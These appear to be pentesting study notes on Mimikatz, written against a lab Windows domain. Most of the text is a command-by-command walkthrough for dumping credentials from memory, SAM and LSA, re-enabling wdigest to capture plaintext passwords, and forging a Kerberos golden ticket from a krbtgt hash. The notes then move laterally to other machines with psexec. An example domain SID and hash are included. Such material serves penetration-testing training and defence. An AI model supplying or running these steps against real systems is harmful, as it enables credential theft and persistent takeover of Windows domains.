### What is Mimikatz
Mimikatz is an open-source application that allows users to view and save authentication credentials like Kerberos tickets. Benjamin Delpy continues to lead Mimikatz developments, so the toolset works with the current release of Windows and includes the most up-to-date attacks.

Attackers commonly use Mimikatz to steal credentials and escalate privileges: in most cases, endpoint protection software and anti-virus systems will detect and delete it. Conversely, pentesters use Mimikatz to detect and exploit vulnerabilities in your networks so you can fix them.

![[Pasted image 20210729085522.png]]

Download mimikatz from
https://github.com/gentilkiwi/mimikatz/releases

### Credential Dumping with Mimikatz
First extract the mimikatz zip folder and go to x64 bit through command prompt and run mimikatz

![[Pasted image 20210729091732.png]]

Now for dumping credentials we have to bypass lsass.exe protection and other protection from memory. We can do this by using `privilege` module in mimikatz. Mimikatz can run module in the following syntax
```bash
# Syntax
<module>::<function>

# To bypass memory protection
privilege::debug
```

And after running this we are looking for `20 Ok message`

![[Pasted image 20210729092103.png]]

Now we will dump all the credentials. So for dumping that we will use
```bash
sekurlsa::logonpasswords
```

![[Pasted image 20210729092214.png]]

This will dump every credentials from the computer

![[Pasted image 20210729092306.png]]

**Note** : The wdigest stores password in plaintext. But after windows 8 this feature has been turned off by windows. So if we can't crack the hashes we can turn on wdigest and wait for someone to login and that way we can get the password

Now we can dump sam hashes, but it doesn't work every time
```bash
lsadump::sam
lsadump::sam /patch
```

![[Pasted image 20210729092714.png]]

Now we can dump lsa hashes
```bash
lsadump::lsa /patch
```

![[Pasted image 20210729093751.png]]

### Golden Ticket Attacks
A golden ticket attack allows an attacker to create a Kerberos authentication ticket from a compromised service account, called krbtgt, with the help of Mimikatz.

With the hash of this compromised account and some information about the domain, an attacker can create fraudulent tickets. These tickets appear pre-authorized to perform whatever action the attackers want without any real authentication.

This attack is stealthy and hard to detect, making it appealing to attackers who plan to live inside a domain for some time. 

To do this we will type
```bash
lsadump::lsa /inject /name:krbtgt
```

![[Pasted image 20210729095312.png]]

From there get the domain SID and the krbtgt ntlm hash
Now type the following command
```bash
# Syntax 
kerberos::golden /User:<any fake user> /domain:<domain name> /sid:<domainsid> /krbtgt:<ntlm hash of krbtgt> /id:<rid of user> /ptt #stands for pass the ticket

#Example
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-367914067-2263268643-1128044544 /krbtgt:c90e7ca6f0c9ce5489b90d222c193488 /id:500 /ptt
```

![[Pasted image 20210729095629.png]]

Now type
```bash
misc::cmd
```

This will open a command prompt and you will have all the access to any machine

![[Pasted image 20210729095727.png]]

After this you can get a `psexec` windows binary and get a shell on any machine through the session created by mimikatz

```bash
psexec.exe \\MachineName\Share cmd
```
